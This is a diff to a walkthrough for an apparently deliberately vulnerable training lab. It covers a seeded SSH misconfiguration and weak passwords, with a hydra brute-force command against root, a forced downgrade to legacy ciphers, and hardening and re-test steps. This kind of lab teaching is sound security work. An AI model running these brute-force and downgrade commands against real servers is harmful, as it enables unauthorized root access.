@@ -49,18 +49,28 @@ export IP=192.168.56.20                              # <-- the victim's IP (ip a
 
 ## 1. SSH wide open: root login, no retry limit, legacy crypto
 - 🧪 **Seeded:** `sshd_config` sets `PermitRootLogin yes`, `PermitEmptyPasswords yes`,
-  `MaxAuthTries 100`, and legacy `Ciphers/MACs/KexAlgorithms`; `root` has the password `toor`.
+  `MaxAuthTries 100`, and **adds** legacy `Ciphers/MACs/KexAlgorithms` (CBC, 3DES, `hmac-md5`,
+  `diffie-hellman-group1-sha1`) *alongside* the modern ones; `root` has the password `toor`.
+  > **Why both legacy and modern?** If the server offered *only* legacy algorithms, modern OpenSSH and
+  > hydra would refuse the handshake (`no matching key exchange method` / `kex error: no match`) and you
+  > couldn't attack it at all. Offering the weak algorithms *in addition* keeps the misconfiguration
+  > visible to `nmap` while letting current clients connect — which is the realistic "server still
+  > accepts weak crypto" finding.
 - 🟠 **Exploit:**
   ```bash
-  nmap -p22 --script ssh2-enum-algos $IP        # lists the weak cbc / sha1 / group1 algos
+  nmap -p22 --script ssh2-enum-algos $IP        # lists the weak cbc / 3des / hmac-md5 / group1 algos
   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$IP -t4
   #  => [22][ssh] host: <IP>  login: root  password: toor
   ssh root@$IP                                   # you are now root
+  # Show the downgrade explicitly — force the deprecated algorithms a hardened server would reject:
+  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oCiphers=+aes256-cbc -oMACs=+hmac-md5 root@$IP
   ```
 - 🟢 **Harden:** in `/etc/ssh/sshd_config` set `PermitRootLogin no`, `PermitEmptyPasswords no`,
-  `MaxAuthTries 4`, `AllowGroups sshadmins`, plus modern `Ciphers`/`MACs`/`KexAlgorithms`; then
-  `systemctl restart ssh`.
-- ✅ **Re-test:** `ssh root@$IP` → *Permission denied*; the hydra run no longer finds root.
+  `MaxAuthTries 4`, `AllowGroups sshadmins`, and restrict to modern algorithms only, e.g.
+  `Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com`,
+  `KexAlgorithms curve25519-sha256`, `MACs hmac-sha2-256`; then `systemctl restart ssh`.
+- ✅ **Re-test:** `ssh root@$IP` → *Permission denied*; the hydra run no longer finds root; the
+  `-oCiphers=+aes256-cbc` downgrade attempt now fails with *no matching cipher*.
 
 ## 2. Weak passwords (`root/toor`, `trainee/123456`)
 - 🧪 **Seeded:** both accounts exist with those exact weak passwords.
